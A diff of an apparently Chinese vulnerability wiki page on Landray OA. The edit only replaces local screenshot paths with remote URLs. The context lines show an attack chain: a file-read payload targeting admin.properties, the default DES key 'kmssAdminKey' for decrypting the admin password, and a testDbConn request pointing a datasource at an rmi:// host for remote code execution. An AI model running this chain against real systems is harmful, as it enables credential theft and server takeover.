@@ -37,11 +37,11 @@ Accept-Encoding: gzip
 var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 ```
 
-![](image/lanling-4.png)
+![](http://wikioss.peiqi.tech/vuln/lanling-4.png)
 
 获取password后，使用 DES方法 解密，默认密钥为 **kmssAdminKey**
 
-![](image/lanling-5.png)
+![](http://wikioss.peiqi.tech/vuln/lanling-5.png)
 
 
 
@@ -51,7 +51,7 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 http://xxx.xxx.xxx.xxx/admin.do
 ```
 
-![](image/lanling-6.png)
+![](http://wikioss.peiqi.tech/vuln/lanling-6.png)
 
 使用工具执行命令
 
@@ -82,5 +82,5 @@ method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg
 
 
 
-![](image/lanling-7.png)
+![](http://wikioss.peiqi.tech/vuln/lanling-7.png)
 
